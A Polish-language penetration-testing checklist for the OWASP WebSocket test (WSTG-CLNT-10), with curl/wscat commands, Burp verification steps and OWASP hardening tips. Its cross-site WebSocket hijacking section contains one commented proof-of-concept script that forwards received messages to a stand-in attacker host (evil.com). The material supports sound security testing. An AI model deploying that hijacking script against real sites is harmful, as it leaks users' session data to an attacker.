# WSTG-CLNT-10 — Testing WebSockets

## Cele

- Identify the usage of WebSockets
- Assess its implementation by using the same tests on normal HTTP channels

## KOMENDY

### Identyfikacja WebSocket

```bash
curl -sI "https://TARGET/" | grep -i "upgrade\|websocket"
# Szukaj ws:// i wss:// w kodzie JS

```

### wscat - interakcja z WebSocket

```bash
wscat -c "wss://TARGET/ws"

```

### Test CSWSH (Cross-Site WebSocket Hijacking)

```bash
# Stworz PoC HTML:
# <script>var ws = new WebSocket('wss://TARGET/ws'); ws.onmessage=function(e){fetch('http://evil.com/?data='+e.data)}</script>

```

### Test injection via WebSocket

```bash
# Wyslij XSS/SQLi payloady przez WebSocket connection

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Web Sockets

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Web Sockets/README.md

```

### Reuse injection payloads z INPV testow

```bash

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Uzyj Burp WebSocket History tab
2. Sprawdz czy WS wymaga autentykacji
3. Testuj CSWSH - czy WS waliduje Origin
4. Wyslij injection payloady (XSS, SQLi) przez WS
5. Sprawdz czy dane z WS sa sanityzowane przed renderowaniem


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — WebSocket_Security_Cheat_Sheet.md

- Waliduj Origin header przy WebSocket handshake
- Uzywaj WSS (WebSocket Secure) zamiast WS
- Uwierzytelniaj polaczenia WebSocket niezaleznie od HTTP session
- Waliduj wszystkie wiadomosci po stronie serwera
- Implementuj rate limiting na wiadomosci

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SocketSleuth | Zaawansowane testowanie WebSocket w Burp | [GitHub](https://github.com/snyk/socketsleuth) |
| WebSocket Turbo Intruder | Fuzzowanie WebSocket z custom kodem | [GitHub](https://github.com/Hannah-PortSwigger/WebSocketTurboIntruder) |
